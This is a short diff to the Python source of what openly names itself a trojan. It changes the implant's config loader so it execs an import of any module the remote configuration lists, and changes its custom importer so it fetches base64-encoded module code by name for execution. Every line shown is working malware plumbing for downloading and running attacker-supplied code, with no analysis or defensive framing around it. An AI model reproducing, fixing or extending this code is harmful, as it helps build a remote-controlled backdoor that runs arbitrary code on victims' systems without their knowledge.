@@ -69,7 +69,7 @@ def get_trojan_config():
 
     for task in config:
         if task['module'] not in sys.modules:
-            exec("import "+"modules/dirlister.py")
+            exec("import "+task['module'])
 
     return config
 
@@ -88,7 +88,7 @@ class gitimporter(object):
         
          if configured:
              print(bold+green+"<xx> Attempting to retrieve : "+fullname);
-             new_library = get_file_contents("modules/"+fullname);
+             new_library = get_file_contents(fullname);
 
              if new_library is not None:
                  self.current_module_code = base64.b64decode(new_library);
